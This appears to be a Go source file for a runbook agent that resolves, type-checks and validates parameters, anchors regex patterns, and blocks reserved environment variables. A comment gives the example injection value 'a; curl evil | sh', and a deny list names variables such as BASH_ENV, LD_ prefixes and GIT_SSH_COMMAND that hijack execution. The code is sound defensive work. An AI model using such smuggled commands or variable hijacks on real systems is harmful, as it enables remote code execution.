package runbook

import (
	"fmt"
	"math"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/peacedouts/nightfix/internal/expr"
)

// ResolveParams computes a run's parameters: supplied values first, then
// `from` expressions over the trigger context, then defaults. Every value is
// type-checked and validated against pattern / enum / min / max.
func ResolveParams(rb *Runbook, supplied map[string]any, ctx expr.Vars) (map[string]any, error) {
	out := map[string]any{}
	for _, name := range sortedKeys(rb.Spec.Parameters) {
		p := rb.Spec.Parameters[name]
		var (
			v     any
			found bool
		)
		if sv, ok := supplied[name]; ok {
			v, found = sv, true
		} else if p.From != "" {
			fv, err := expr.Eval(p.From, ctx)
			if err == nil && fv != nil {
				v, found = fv, true
			}
		}
		if !found && p.Default != nil {
			v, found = p.Default, true
		}
		if !found {
			if p.Required {
				return nil, fmt.Errorf("parameter %q is required", name)
			}
			continue
		}
		cv, err := coerceParam(name, p, v)
		if err != nil {
			return nil, err
		}
		out[name] = cv
	}
	for k := range supplied {
		if _, ok := rb.Spec.Parameters[k]; !ok {
			return nil, fmt.Errorf("unknown parameter %q", k)
		}
	}
	return out, nil
}

// ValidateParams re-checks already-resolved parameters. The agent calls this
// as defense in depth against a buggy or compromised control plane.
func ValidateParams(rb *Runbook, params map[string]any) error {
	for k, v := range params {
		p, ok := rb.Spec.Parameters[k]
		if !ok {
			return fmt.Errorf("unknown parameter %q", k)
		}
		if _, err := coerceParam(k, p, v); err != nil {
			return err
		}
	}
	for _, name := range sortedKeys(rb.Spec.Parameters) {
		if rb.Spec.Parameters[name].Required {
			if _, ok := params[name]; !ok {
				return fmt.Errorf("parameter %q is required", name)
			}
		}
	}
	return nil
}

func coerceParam(name string, p Param, v any) (any, error) {
	bad := func(format string, args ...any) (any, error) {
		return nil, fmt.Errorf("parameter %q: "+format, append([]any{name}, args...)...)
	}
	switch p.Type {
	case "string":
		s, ok := v.(string)
		if !ok {
			return bad("want string, got %T", v)
		}
		if len(s) > 1024 {
			return bad("value too long")
		}
		if p.Pattern != "" {
			re, err := CompilePattern(p.Pattern)
			if err != nil {
				return bad("invalid pattern")
			}
			if !re.MatchString(s) {
				return bad("value %q does not match %s", s, p.Pattern)
			}
		}
		return s, nil
	case "enum":
		for _, allowed := range p.Values {
			if fmt.Sprint(allowed) == fmt.Sprint(v) {
				return allowed, nil
			}
		}
		return bad("value %v is not one of %v", v, p.Values)
	case "int":
		var n int64
		switch x := v.(type) {
		case int64:
			n = x
		case int:
			n = int64(x)
		case float64:
			if x != math.Trunc(x) {
				return bad("want integer, got %v", x)
			}
			n = int64(x)
		case string:
			i, err := strconv.ParseInt(x, 10, 64)
			if err != nil {
				return bad("want integer, got %q", x)
			}
			n = i
		default:
			return bad("want integer, got %T", v)
		}
		if p.Min != nil && float64(n) < toFloat(p.Min) {
			return bad("below minimum %v", p.Min)
		}
		if p.Max != nil && float64(n) > toFloat(p.Max) {
			return bad("above maximum %v", p.Max)
		}
		return n, nil
	case "bool":
		switch x := v.(type) {
		case bool:
			return x, nil
		case string:
			b, err := strconv.ParseBool(x)
			if err != nil {
				return bad("want bool, got %q", x)
			}
			return b, nil
		}
		return bad("want bool, got %T", v)
	case "duration":
		s, ok := v.(string)
		if !ok {
			return bad("want duration string, got %T", v)
		}
		if _, err := time.ParseDuration(s); err != nil {
			return bad("invalid duration %q", s)
		}
		return s, nil
	}
	return bad("unknown type %q", p.Type)
}

func toFloat(v any) float64 {
	switch x := v.(type) {
	case float64:
		return x
	case int64:
		return float64(x)
	case int:
		return float64(x)
	case string:
		f, _ := strconv.ParseFloat(x, 64)
		return f
	}
	return 0
}

// CompilePattern compiles a parameter pattern so it must match the whole
// value. Patterns are a security control on alert-derived input, and a
// substring match ("[a-z]+" matching "a; curl evil | sh") would defeat it.
func CompilePattern(p string) (*regexp.Regexp, error) {
	// The pattern must stand on its own: "a)|(.*" would otherwise close the
	// wrapper's group and leave an unanchored alternative.
	if _, err := regexp.Compile(p); err != nil {
		return nil, err
	}
	return regexp.Compile(`^(?:` + p + `)$`)
}

// ReservedEnv reports whether an env name may not be set by a runbook: the
// agent's own variables, and names the shell or dynamic loader act on
// (BASH_ENV, for one, is expanded and run before the script itself).
func ReservedEnv(name string) bool {
	switch name {
	case "PATH", "HOME", "TMPDIR", "LANG", "IFS", "ENV", "SHELLOPTS", "BASHOPTS", "PS4", "PROMPT_COMMAND",
		"CDPATH", "GLOBIGNORE", "POSIXLY_CORRECT", "PYTHONPATH", "PYTHONSTARTUP", "PYTHONHOME", "PYTHONUSERBASE", "PYTHONEXECUTABLE", "PERL5LIB", "PERL5OPT",
		"PERLLIB", "RUBYOPT", "RUBYLIB", "NODE_OPTIONS", "GCONV_PATH", "JAVA_TOOL_OPTIONS", "_JAVA_OPTIONS", "JDK_JAVA_OPTIONS",
		"LESSOPEN", "LESSCLOSE", "PAGER", "EDITOR", "VISUAL", "SSH_ASKPASS", "SUDO_ASKPASS", "GIT_ASKPASS", "GIT_SSH", "GIT_SSH_COMMAND",
		"GIT_EXEC_PATH", "GIT_PAGER", "GIT_EDITOR", "GIT_PROXY_COMMAND", "AWS_CONFIG_FILE", "AWS_SHARED_CREDENTIALS_FILE":
		return true
	}
	for _, prefix := range []string{"BASH_", "LD_", "DYLD_", "GIT_CONFIG"} {
		if strings.HasPrefix(name, prefix) {
			return true
		}
	}
	return false
}
